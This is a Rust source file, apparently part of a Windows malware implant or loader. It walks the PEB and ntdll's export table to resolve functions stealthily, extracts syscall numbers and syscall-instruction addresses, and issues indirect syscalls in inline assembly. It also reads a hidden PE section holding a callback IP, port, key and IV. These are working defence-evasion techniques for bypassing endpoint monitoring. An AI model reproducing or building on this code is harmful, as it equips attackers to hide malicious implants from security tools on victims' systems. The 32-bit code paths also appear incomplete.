use core::panic;
use std::{arch::asm, ffi::{c_void, OsString}, ops::Add, os::windows::ffi::OsStringExt, ptr::read, slice::from_raw_parts, str::from_utf8, usize};

use windows::{Win32::{System::{Diagnostics::Debug::IMAGE_NT_HEADERS64}}};
use windows::Win32::System::SystemServices::*;

use windows::Win32::System::Diagnostics::Debug::{IMAGE_SECTION_HEADER};
use std::str;
use windows::Win32::Foundation::NTSTATUS;

type Byte = u8;

#[repr(C)]
struct PEB {
    reserved1: [Byte; 2],
    being_debugged: Byte,
    reserved2: [Byte; 1],
    reserved3: [*const c_void; 1],
    image_base: *const c_void,
    ldr: usize
}

pub struct CONFIG {
    pub ip: String,
    pub port: String,
    pub key: String,
    pub iv:String
}

pub fn get_section(section: &str) -> CONFIG {
    let base_addy = get_image_base();
    let dos_header = get_dos_header(base_addy);


    if dos_header.e_magic != 0x5A4D {
        panic!("Magic is not correct: {}", dos_header.e_magic);
    }
    let nt_header = get_nt_header(base_addy);

    if nt_header.Signature != 0x4550 {
        panic!("Invalid signature {:x}", nt_header.Signature)
    }

    let nt_header_ptr = nt_header as *const IMAGE_NT_HEADERS64;

    let mut pSection: *mut c_void;
    let mut config_data = "";
    unsafe {
        // 0x4 as signature is a dword
        pSection =  (nt_header_ptr as *const c_void).add(0x4 + IMAGE_SIZEOF_FILE_HEADER as usize + nt_header.FileHeader.SizeOfOptionalHeader as usize) as *mut c_void;

        for _i in 0..nt_header.FileHeader.NumberOfSections {

            let current_section = *(pSection as *mut IMAGE_SECTION_HEADER);
            let current_section_name = &current_section.Name;

            let str= match from_utf8(current_section_name) {
                Ok(s) => s.trim_end_matches('\0'),
                Err(_) => "Invalid UTF-8",
            };

            if str.eq(section) {
                let ptr_to_data: *const u8 = base_addy.add(current_section.VirtualAddress as usize) as *const u8;

                let config_data_char: &[u8] = {
                    let char: *const u8 = ptr_to_data as *const u8;
                    let mut len = 0;

                    while *char.add(len) != 0 {
                        len += 1;
                    }
                    from_raw_parts(char, len)
                };

                config_data = from_utf8(config_data_char).unwrap_or("INVALID UTF-8");
                println!("{}", config_data)
            }

            // move onto next section
            pSection = pSection.add(IMAGE_SIZEOF_SECTION_HEADER as usize);
        }

    }

    let pairs: Vec<&str> = config_data.split('&').collect();

    // Iterate over each pair and split on '='
    let mut result = Vec::new();
    for pair in pairs {
        let mut parts = pair.split('=');
        if let (Some(key), Some(value)) = (parts.next(), parts.next()) {
            result.push((key, value));
        }
    }

    let parsed_config;

    if result.len() == 4 {
        parsed_config = CONFIG {
            ip: String::from(result[0].1),
            port: String::from(result[1].1),
            key: String::from(result[2].1),
            iv: String::from(result[3].1)
        };
    }else{
        parsed_config = CONFIG {
            ip: String::from("null"),
            port: String::from("null"),
            key: String::from("null"),
            iv: String::from("null")
        };
    }


    return parsed_config;
}

pub fn get_syscall_address(func_addy: usize) -> *const Byte {
    let syscall_addy: *const Byte;
    unsafe {
        syscall_addy = (func_addy as *const Byte).add(0x12);
    }

    syscall_addy
}

pub fn get_ssn(func_addy: usize) -> u32 {
    let ssn: Byte;
    unsafe {
        let src = func_addy as *const Byte;
        ssn = read(src.add(0x4));
    }
    ssn as u32
}

pub(crate) fn get_func_from_exports(dll_name: &str, func_name_prov: &str) -> Option<usize> {
    let dll_base = match get_mod_base_addy(dll_name) {
        Some(a) => a,
        None => panic!("Could not find ntdll base addy"),
    }as *const c_void;

    unsafe{
        let dos_header = read(dll_base as *const IMAGE_DOS_HEADER);
        if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
            panic!("DOS HEADER NOT PRESENT")
        }

        println!("[+] Dos header matched");

        let nt_header = read(dll_base.offset(dos_header.e_lfanew as isize) as *const IMAGE_NT_HEADERS64);
        if nt_header.Signature != IMAGE_NT_SIGNATURE {
            panic!("ntheader no match")
        }

        let export_dir_rva = nt_header.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
        let export_offset = dll_base.add(export_dir_rva as usize);

        let export_dir = read(export_offset as *const IMAGE_EXPORT_DIRECTORY);

        let address_of_functions_rva = export_dir.AddressOfFunctions as usize;
        let address_of_names_rva = export_dir.AddressOfNames as usize;
        let ordinals_rva = export_dir.AddressOfNameOrdinals as usize;

        let functions = dll_base.add(address_of_functions_rva) as *const u32;
        let names = dll_base.add(address_of_names_rva) as *const u32;
        let ordinals: *const u16 = dll_base.add(ordinals_rva) as *const u16;

        let num_of_names = export_dir.NumberOfNames;

        for i in 0..num_of_names {
            let name_rva = *names.offset(i.try_into().unwrap()) as usize;
            let name_addr = dll_base.add(name_rva);


            let func_name: &[u8] = {
                let char: *const u8 = name_addr as *const u8;
                let mut len = 0;

                while *char.add(len) != 0 {
                    len += 1;
                }
                from_raw_parts(char, len)
            };

            let fnnn_name = from_utf8(func_name).unwrap_or("INVALID UTF-8");

            if fnnn_name.eq(func_name_prov) {
                println!("[+] Found: {}", func_name_prov);

                let ord = *ordinals.offset(i.try_into().unwrap()) as isize;
                let fn_rva = *functions.offset(ord) as usize;
                let fn_addy = dll_base.add(fn_rva) as *const c_void;

                println!("[+] {} Addy {:p}",func_name_prov, fn_addy);

                return Some(fn_addy as usize);
            }

        }
    }

    None

}

fn get_mod_base_addy(module_name: &str) -> Option<usize> {
    let module_list: usize;

    unsafe {
        let ldr: usize;
        let peb: *const PEB = get_peb();
        ldr = (*peb).ldr;
        if ldr == 0 {
            panic!("Loader is null")
        }

        module_list = ldr + 0x10;
        let mut current_entry = module_list;

        loop {
            let dll_base: usize = *(current_entry.add(0x30) as *const usize);
            let mod_name_addy: usize = *(current_entry.add(0x60) as *const usize);
            let mod_len: u16 = *(current_entry.add(0x58) as *const u16);

            if mod_name_addy != 0 && mod_len != 0 {
                let dll_name_slice: &[u16] = from_raw_parts(mod_name_addy as *const u16, (mod_len / 2) as usize);
                let dll_name = OsString::from_wide(dll_name_slice);

                if dll_name.to_string_lossy().eq_ignore_ascii_case(module_name){
                    return Some(dll_base)
                }
            }

            current_entry = *(current_entry as *const usize);

            if current_entry == module_list{
                println!("Couldnt find module");
                return None;
            }
        }
    }
}

#[cfg(target_arch = "x86_64")]
fn get_nt_header<'a>(base_addy: *const c_void) -> &'a IMAGE_NT_HEADERS64 {
    unsafe {
        let dos_header = get_dos_header(base_addy);
        return &*(base_addy.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    }
}

#[cfg(target_arch = "x86")]
fn get_nt_header<'a>(base_addy: *const c_void) -> &'a IMAGE_NT_HEADERS32 {
    unsafe {
        let dos_header = get_dos_header(base_addy);
        return &*(read(base_addy.offset(dos_header.e_lfanew as isize) as *const IMAGE_NT_HEADERS32));
    }
}

fn get_dos_header<'a>(base_addy: *const c_void) -> &'a IMAGE_DOS_HEADER {
    unsafe { &*(base_addy as *const IMAGE_DOS_HEADER) }
}

fn get_image_base() -> *const c_void {
    unsafe {
        let peb = get_peb();
        return (*peb).image_base;
    }
}

fn get_peb() -> *const PEB{
    let peb: *const PEB;

    #[cfg(target_arch = "x86_64")]
    {
        peb = get_peb_64();
    }
    peb
}


#[cfg(target_arch = "x86_64")]
fn get_peb_64() -> *const PEB {
    let peb: u64;
    let _teb: u64;
    unsafe {
        asm!(
        "mov {_teb}, gs:[0x30]", // Get Thread Environment Block
        "mov {peb}, [{_teb} + 0x60]", // Get Peb
        _teb = out(reg) _teb,
        peb = out(reg) peb,
        );
    }
    return peb as *const PEB;
}

#[cfg(target_arch = "x86")]
fn get_peb_32() -> *const PEB {

    let peb: u32;
    let _teb: u32;
    unsafe {
        asm!(
        "mov {_teb}, fs:[0x18]", // Get Thread Environment Block
        "mov {peb}, [{_teb} + 0x30]", // Get Peb
        _teb = out(reg) _teb,
        peb = out(reg) peb,
        );
    }
    return peb as *const PEB;
}

// Start Of Func Definitions
pub fn nt_query_system_info(
    system_info_class: u32,
    system_info: *mut c_void,
    system_info_len: u32,
    ret_len: *mut u32,
    ssn: u32,
    syscall_addy: *const u8) -> NTSTATUS {
    let status: i32;
    let syscall_addy_asm = syscall_addy as *const u64;
    unsafe {
        asm!(
        "mov r10, rcx",
        "mov eax, {0:e}",
        "call r12",
        in(reg) ssn,
        in("r12") syscall_addy_asm,
        in("rcx") system_info_class,
        in("rdx") system_info,
        in("r8") system_info_len,
        in("r9") ret_len,
        lateout("rax") status,
        options(nostack),
        )
    }

    NTSTATUS(status)
}

pub fn nt_query_thread_info(thread_handle: *mut c_void, thread_info_class: i32, thread_info: *mut c_void, thread_info_len: u32, ret_len: *mut u32, ssn: u32, syscall_addy: *const u8) -> NTSTATUS
{
    let status: i32;
    let syscall_addy_asm = syscall_addy as *const u64;
    unsafe {
        asm!(
        "mov [rsp+0x20], r11",
        "mov r10, rcx",
        "mov eax, {0:e}",
        "call r12",
        in(reg) ssn,
        in("r11") ret_len,
        in("r12") syscall_addy_asm,
        in("rcx") thread_handle,
        in("rdx") thread_info_class,
        in("r8") thread_info,
        in("r9") thread_info_len,
        lateout("rax") status,
        options(nostack)
        )
    }
    NTSTATUS(status)
}




